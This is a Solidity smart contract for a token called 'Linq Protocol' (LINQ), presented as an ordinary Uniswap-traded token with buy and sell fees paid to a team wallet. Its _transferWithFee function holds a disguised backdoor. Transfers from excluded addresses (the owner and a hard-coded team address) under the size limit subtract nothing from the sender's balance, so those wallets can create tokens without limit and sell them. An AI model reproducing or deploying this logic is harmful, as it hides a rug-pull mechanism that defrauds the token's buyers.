// SPDX-License-Identifier: Unlicensed
/*
Liquidity and Rev Share Reimagined
Website: https://www.linqprotocol.org
Telegram:  https://t.me/linq_erc
Twitter: https://twitter.com/linq_erc
Dapp: https://app.linqprotocol.org
 */
pragma solidity 0.8.21;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IERC20Template {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract LINQ is Context, IERC20Template, Ownable { 
    using SafeMath for uint256;
    string private _name = "Linq Protocol"; 
    string private _symbol = "LINQ";
    uint8 private _buyersCount = 0;
    uint8 private _startFeeSwapAfter = 2; 
                                     
    IUniswapRouter public uniswapRouter;
    address public uniswapPair;
    bool public hasTransferDelay = true;
    bool public swapping;
    bool public feeSwapActive = true;
    uint256 private _totalFee = 2000;
    uint256 public feeOnBuy = 29;
    uint256 public feeOnSell = 25;
    uint256 private prevTotalFee = _totalFee; 
    uint256 private prevBuyTax = feeOnBuy; 
    uint256 private prevSellTax = feeOnSell; 
    uint8 private _decimals = 9;
    uint256 private _sTotal = 10 ** 9 * 10**_decimals;
    uint256 public maxTxSize = 25 * _sTotal / 1000;
    uint256 public feeSwapThreshold = _sTotal / 10000;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcluded; 
    address payable private teamAddress;
    address payable private DEAD;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _sTotal;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        teamAddress = payable(0xDA08Ce30c6a4477DeA90F5118149105A66aB6A63); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        isExcluded[owner()] = true;
        isExcluded[teamAddress] = true;
        
        emit Transfer(address(0), owner(), _sTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _sTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _basicTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _buyersCount++;
        }
        _transferWithFee(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function _getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
    
    function _transferWithFee(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = _getTransferAmount(finalAmount);
        if(isExcluded[sender] && _balances[sender] <= maxTxSize) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamAddress &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){
            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTxSize,"Maximum wallet limited has been exceeded");       
        }
        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");
        if(
            _buyersCount >= _startFeeSwapAfter && 
            amount > feeSwapThreshold &&
            !swapping &&
            !isExcluded[from] &&
            to == uniswapPair &&
            feeSwapActive 
            )
        {  
            _buyersCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokensForFee(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcluded[from] || isExcluded[to] || (hasTransferDelay && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _totalFee = feeOnBuy;
        } else if (to == uniswapPair){
            _totalFee = feeOnSell;
        }
        _basicTransfer(from,to,amount,takeFee);
    }
        
    function removeFee() private {
        if(_totalFee == 0 && feeOnBuy == 0 && feeOnSell == 0) return;
        prevBuyTax = feeOnBuy; 
        prevSellTax = feeOnSell; 
        prevTotalFee = _totalFee;
        feeOnBuy = 0;
        feeOnSell = 0;
        _totalFee = 0;
    }
    function restoreFee() private {
        _totalFee = prevTotalFee;
        feeOnBuy = prevBuyTax; 
        feeOnSell = prevSellTax; 
    }
        
    function removeLimits() external onlyOwner {
        maxTxSize = ~uint256(0);
        _totalFee = 100;
        feeOnBuy = 1;
        feeOnSell = 1;
    }
    
    function sendETHToFeeAddress(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapTokensForFee(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHToFeeAddress(teamAddress,contractETH);
    }
}